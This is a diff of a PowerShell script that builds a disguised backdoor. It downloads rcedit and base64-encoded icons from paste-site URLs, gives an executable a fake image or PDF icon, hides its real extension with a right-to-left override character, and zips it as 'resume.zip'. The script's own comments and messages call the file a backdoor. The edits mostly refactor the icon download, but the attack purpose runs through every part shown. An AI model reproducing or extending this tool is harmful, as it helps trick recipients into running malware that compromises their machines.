@@ -27,9 +27,7 @@ function rcEditInstall {
     
         [string]$InstallPath,
         [string]$rcEditUrl,
-        [string]$jpgIcoUrl,
-        [string]$pdfIcoUrl,
-        [string]$pngIcoUrl
+        [string[]]$icoToGet
             
     )
 
@@ -40,7 +38,6 @@ function rcEditInstall {
     $PngIconPath=(-join($rcEditIcoDir,'\','png.ico'))
     $rcEditExePath=(-join($rcEditExeDir,'\','rcedit-x64.exe'))
     $rcEditDirs=@($rcEditExeDir,$rcEditIcoDir)
-    $IconsUrls=@($jpgIcoUrl,$pdfIcoUrl,$pngIcoUrl)
     $IconsPath=@($JpgIconPath,$PdfIconPath,$PngIconPath)
     
     if(-not [System.IO.File]::Exists($rcEditExePath)){
@@ -51,21 +48,21 @@ function rcEditInstall {
     
         }
 
-        for ($i = 0; $i -lt $IconsUrls.Count; $i++){
+        for ($i = 0; $i -lt $icoToGet.Count; $i++){
     
-            $icoUrl = $IconsUrls[$i]
+            $icoUrl = $icoToGet[$i]
             $icoPath = $IconsPath[$i]
             $tmpTXTB64 = (-join($env:TMP,'\','tmpImg.txt'))
             Invoke-WebRequest -Uri $icoUrl -OutFile $tmpTXTB64 -MaximumRedirection 1
             $base64Content = Get-Content -Path $tmpTXTB64 -Raw
             $iconBytes = [System.Convert]::FromBase64String($base64Content)
             [System.IO.File]::WriteAllBytes($icoPath, $iconBytes)
-            Remove-Item -Recurse $tmpTXTB64
+            Remove-Item $tmpTXTB64
 
         }
 
         Start-BitsTransfer -Source $rcEditUrl -Destination $rcEditExePath
-        Write-Host "rcedit has been downloaded and installed in $rcEditExeDir"
+        Write-Host "rcedit has been downloaded and installed in the folder $rcEditExeDir"
 
     }
 
@@ -101,18 +98,20 @@ function fakeBexed {
     Invoke-Expression $bkdoorEdit
     Rename-Item -Path $TmpExeEdit -NewName ("Ann" + ( [char]0x202E ) + $fakeExt[$fext])
     Compress-Archive -Path (Get-Item $TmpExeFext).FullName -DestinationPath $zipFileName -Force
+    Write-Host "The backdoor has been zipped in the archive $zipFileName"
     Remove-Item -Recurse (Get-Item $TmpExeFext).FullName
 
 }
 
 # The script zip the backdoor under the name "resume.zip"
 
-$toolkitDir=(-join($env:LOCALAPPDATA,'\','rcedit'))
 $rceditUrlgit='https://github.com/electron/rcedit/releases/download/v2.0.0/rcedit-x64.exe'
-$JpgIcoUrltxt='https://friendpaste.com/4y8LNw4UqeFLwhBhZlafrf/original?rev=353063333130'
-$PdfIcoUrltxt='https://friendpaste.com/4Fxoj9drYNa4CWasQCL6h3/original?rev=343332383164'
-$PngIcoUrltxt='https://friendpaste.com/4y8LNw4UqeFLwhBhZlS4QA/original?rev=323530613336'
+$JpgIcoUrl='https://friendpaste.com/4y8LNw4UqeFLwhBhZlafrf/original?rev=353063333130'
+$PdfIcoUrl='https://friendpaste.com/4Fxoj9drYNa4CWasQCL6h3/original?rev=343332383164'
+$PngIcoUrl='https://friendpaste.com/4y8LNw4UqeFLwhBhZlS4QA/original?rev=323530613336'
+$IconsUrls=@($JpgIcoUrl,$PdfIcoUrl,$PngIcoUrl)
+$toolkitDir=(-join($env:LOCALAPPDATA,'\','rcedit'))
 
-rcEditInstall -InstallPath $toolkitDir -rcEditUrl $rceditUrlgit -jpgIcoUrl $JpgIcoUrltxt -pdfIcoUrl $PdfIcoUrltxt -pngIcoUrl $PngIcoUrltxt
+rcEditInstall -InstallPath $toolkitDir -rcEditUrl $rceditUrlgit -icoToGet $IconsUrls
 $ext = $ext.ToLower()
 fakeBexed -fext $ext -exeObf $exeTObfs -zipName "resume" -rceditInstall $toolkitDir
